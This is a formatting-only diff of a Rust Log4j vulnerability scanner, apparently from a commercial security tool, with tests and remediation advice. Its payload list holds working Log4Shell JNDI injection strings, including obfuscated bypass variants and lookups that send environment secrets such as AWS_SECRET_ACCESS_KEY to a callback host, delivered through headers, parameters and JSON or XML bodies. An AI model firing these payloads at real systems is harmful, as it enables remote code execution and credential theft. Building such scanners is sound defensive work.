@@ -11,7 +11,6 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary
  */
-
 use crate::detection_helpers::AppCharacteristics;
 use crate::http_client::HttpClient;
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
@@ -90,11 +89,17 @@ impl Log4jScanner {
             format!("${{jndi:${{lower:l}}dap://{}/a}}", callback),
             // Environment variable lookups (info disclosure)
             format!("${{jndi:ldap://{}/$${{env:USER}}}}", callback),
-            format!("${{jndi:ldap://{}/$${{env:AWS_SECRET_ACCESS_KEY}}}}", callback),
+            format!(
+                "${{jndi:ldap://{}/$${{env:AWS_SECRET_ACCESS_KEY}}}}",
+                callback
+            ),
             format!("${{jndi:ldap://{}/$${{sys:user.name}}}}", callback),
             format!("${{jndi:ldap://{}/$${{java:version}}}}", callback),
             // Double encoding
-            format!("${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{}/a}}", callback),
+            format!(
+                "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{}/a}}",
+                callback
+            ),
             // Unicode bypass
             format!("${{jndi:ldap://{}/\u{0061}}}", callback),
             // Base64 wrapped (some parsers decode)
@@ -103,7 +108,10 @@ impl Log4jScanner {
     }
 
     /// Test injection via HTTP headers (most common vector)
-    async fn test_header_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+    async fn test_header_injection(
+        &self,
+        url: &str,
+    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
         let payloads = self.get_jndi_payloads();
         let tests_run = payloads.len() * 10; // Multiple headers per payload
@@ -124,9 +132,8 @@ impl Log4jScanner {
 
         for payload in &payloads {
             for header_name in &vulnerable_headers {
-                let headers: Vec<(String, String)> = vec![
-                    (header_name.to_string(), payload.clone())
-                ];
+                let headers: Vec<(String, String)> =
+                    vec![(header_name.to_string(), payload.clone())];
 
                 match self.http_client.get_with_headers(url, headers).await {
                     Ok(response) => {
@@ -150,7 +157,10 @@ impl Log4jScanner {
     }
 
     /// Test injection via URL parameters
-    async fn test_parameter_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+    async fn test_parameter_injection(
+        &self,
+        url: &str,
+    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
         let payloads = self.get_jndi_payloads();
         let tests_run = payloads.len() * 5;
@@ -193,7 +203,7 @@ impl Log4jScanner {
         for payload in &payloads {
             // JSON body
             let json_body = format!(r#"{{"username":"{}","password":"test"}}"#, payload);
-            
+
             match self.http_client.post(url, json_body).await {
                 Ok(response) => {
                     if self.detect_log4j_indicators(&response.body, &response.headers) {
@@ -209,8 +219,11 @@ impl Log4jScanner {
             }
 
             // XML body (Log4j also processes XML)
-            let xml_body = format!(r#"<?xml version="1.0"?><root><data>{}</data></root>"#, payload);
-            
+            let xml_body = format!(
+                r#"<?xml version="1.0"?><root><data>{}</data></root>"#,
+                payload
+            );
+
             match self.http_client.post(url, xml_body).await {
                 Ok(response) => {
                     if self.detect_log4j_indicators(&response.body, &response.headers) {
@@ -294,9 +307,10 @@ impl Log4jScanner {
                          2. Set log4j2.formatMsgNoLookups=true\n\
                          3. Remove JndiLookup class from classpath\n\
                          4. Use WAF rules to block JNDI patterns\n\
-                         5. Monitor outbound connections for LDAP/RMI traffic".to_string(),
+                         5. Monitor outbound connections for LDAP/RMI traffic"
+                .to_string(),
             discovered_at: chrono::Utc::now().to_rfc3339(),
-                ml_data: None,
+            ml_data: None,
         }
     }
 }
@@ -322,7 +336,7 @@ mod tests {
         let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
         let scanner = Log4jScanner::new(http_client);
         let payloads = scanner.get_jndi_payloads();
-        
+
         assert!(!payloads.is_empty());
         assert!(payloads.iter().any(|p| p.contains("jndi:ldap")));
         assert!(payloads.iter().any(|p| p.contains("jndi:rmi")));
@@ -332,15 +346,13 @@ mod tests {
     fn test_indicator_detection() {
         let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
         let scanner = Log4jScanner::new(http_client);
-        
-        assert!(scanner.detect_log4j_indicators(
-            "Error: javax.naming.NamingException",
-            &HashMap::new()
-        ));
-        
-        assert!(!scanner.detect_log4j_indicators(
-            "Normal response without indicators",
-            &HashMap::new()
-        ));
+
+        assert!(
+            scanner.detect_log4j_indicators("Error: javax.naming.NamingException", &HashMap::new())
+        );
+
+        assert!(
+            !scanner.detect_log4j_indicators("Normal response without indicators", &HashMap::new())
+        );
     }
 }
